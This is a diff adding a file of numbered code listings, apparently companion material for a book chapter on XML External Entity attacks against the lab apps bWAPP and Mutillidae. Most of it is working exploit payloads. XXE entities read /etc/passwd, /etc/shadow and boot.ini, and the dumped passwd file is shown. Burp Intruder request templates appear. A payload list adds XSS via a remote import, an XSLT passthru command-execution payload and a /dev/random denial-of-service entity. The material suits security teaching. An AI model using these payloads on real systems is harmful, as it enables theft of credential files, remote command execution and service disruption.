@@ -1,0 +1,144 @@
+//code 8.1
+<email>
+  <to>Bob</to>
+  <from>John</from>
+  <message>Hello, Bob.</message>
+</email>
+
+
+--------------
+
+
+//code 8.2
+<?xml version="1.0"?>
+    <!DOCTYPE change-log [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]><text>&xxe;</text>
+
+
+-----------
+
+//code 8.3
+//XML Submitted
+<?xml version="1.0"?> 
+<!DOCTYPE change-log [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<text>&xxe;</text> 
+//Text Content Parsed From XML
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:102::/home/syslog:/bin/false klog:x:102:103::/home/klog:/bin/false mysql:x:103:105:MySQL Server,,,:/var/lib/mysql:/bin/false landscape:x:104:122::/var/lib/landscape:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin postgres:x:106:109:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash messagebus:x:107:114::/var/run/dbus:/bin/false tomcat6:x:108:115::/usr/share/tomcat6:/bin/false user:x:1000:1000:user,,,:/home/user:/bin/bash polkituser:x:109:118:PolicyKit,,,:/var/run/PolicyKit:/bin/false haldaemon:x:110:119:Hardware abstraction layer,,,:/var/run/hald:/bin/false pulse:x:111:120:PulseAudio daemon,,,:/var/run/pulse:/bin/false postfix:x:112:123::/var/spool/postfix:/bin/false 
+
+---------------------
+
+//code 8.4
+POST /bWAPP/xxe-2.php HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/bWAPP/xxe-1.php
+Content-type: text/xml; charset=UTF-8
+Content-Length: 61
+Cookie: security_level=2; PHPSESSID=fjilqqjim5kuqn7t7v7khqgue4; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Connection: close
+<reset><login>Lokhu</login><secret>Any bugs?</secret></reset>
+
+--------------------------
+
+//code 8.5
+POST /bWAPP/xxe-2.php HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/bWAPP/xxe-1.php
+Content-type: text/xml; charset=UTF-8
+Content-Length: 61
+Cookie: security_level=2; PHPSESSID=fjilqqjim5kuqn7t7v7khqgue4; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Connection: close
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE Header [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+----------------------------
+
+//code 8.7
+GET /mutillidae/index.php?page=xml-validator.php&xml=idnf&xml-validator-php-submit-button=Validate+XML HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/mutillidae/index.php?page=xml-validator.php&xml=%3Csomexml%3E%3Cmessage%3EHello+World%3C%2Fmessage%3E%3C%2Fsomexml%3E+&xml-validator-php-submit-button=Validate+XML
+Cookie: showhints=1; PHPSESSID=qaobudj106cmtfd0uepmei7la6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+----------------------------------
+
+//code 8.8
+//using Intruder tool of Burp Suite
+GET /mutillidae/index.php?page=§xml-validator.php§&xml=§idnf§&xml-validator-php-submit-button=§Validate+XML§ HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/mutillidae/index.php?page=xml-validator.php&xml=%3Csomexml%3E%3Cmessage%3EHello+World%3C%2Fmessage%3E%3C%2Fsomexml%3E+&xml-validator-php-submit-button=Validate+XML
+Cookie: showhints=§1§; PHPSESSID=§qaobudj106cmtfd0uepmei7la6§; acopendivids=§swingset,jotto,phpbb2,redmine§; acgroupswithpersist=§nada§
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Watch the first line:
+GET /mutillidae/index.php?page=§xml-validator.php§&xml=§idnf§&xml-validator-php-submit-button=§Validate+XML§ HTTP/1.1
+
+------------------------------
+
+//code 8.9
+GET /mutillidae/index.php?page=xml-validator.php&xml=§idnf§&xml-validator-php-submit-button=Validate+XML HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/mutillidae/index.php?page=xml-validator.php&xml=%3Csomexml%3E%3Cmessage%3EHello+World%3C%2Fmessage%3E%3C%2Fsomexml%3E+&xml-validator-php-submit-button=Validate+XML
+Cookie: showhints=1; PHPSESSID=qaobudj106cmtfd0uepmei7la6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+------------------------------
+
+//code 8.10
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<xml SRC="xsstest.xml" ID=I></xml>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://sanjibsinha.fun/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://sanjibsinha.fun/xss.htc">
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text> </change-log>
+<!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../../boot.ini"> ]> <change-log> <text>&systemEntity;</text> </change-log>
+<!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text>; </change-log>
+
+--------------------------------
+
+//code 8.11
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+
+---------------------------
+
+//code 8.12
+XML Submitted
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><text>&xxe;</text> 
+Text Content Parsed From XML
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh …..
+
+------------------
+
+
